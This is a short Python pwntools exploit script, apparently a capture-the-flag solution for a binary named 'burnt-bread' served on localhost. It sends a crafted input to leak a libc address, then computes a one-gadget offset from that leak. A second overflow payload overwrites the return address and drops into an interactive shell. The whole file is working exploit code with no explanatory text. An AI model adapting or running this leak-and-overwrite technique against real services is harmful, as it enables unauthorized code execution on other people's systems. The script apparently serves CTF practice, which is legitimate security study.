from pwn import *

e = ELF('./libc-2.31.so')
# r = process('./burnt-bread')
r = remote('localhost', 8000)

r.recvuntil(b'Parser')
r.sendline(b'887F' + b'FF'*72)

r.recvuntil(b'format: ')
r.recvline()
libc_leak_rev = r.recvline()
print(libc_leak_rev)
libc_leak_rev = libc_leak_rev.split(b': ')[1].strip()[72*2:].decode('utf-8')
print(libc_leak_rev)
libc_leak = ''
for i in range(0, len(libc_leak_rev), 2):
    libc_leak = libc_leak_rev[i] + libc_leak_rev[i+1] + libc_leak
print(libc_leak)
libc_leak = int(libc_leak, 16) - e.symbols['_IO_2_1_stdin_']
print(hex(libc_leak))

shell = libc_leak + 0xe6c81

print(hex(shell))

encoded_shell = hex(shell)[2:]
reversed_shell = ''
for i in range(0, len(encoded_shell), 2):
    reversed_shell = encoded_shell[i] + encoded_shell[i+1] + reversed_shell

r.sendline(b'427F' + b'41'*26 + str.encode(reversed_shell))

r.interactive()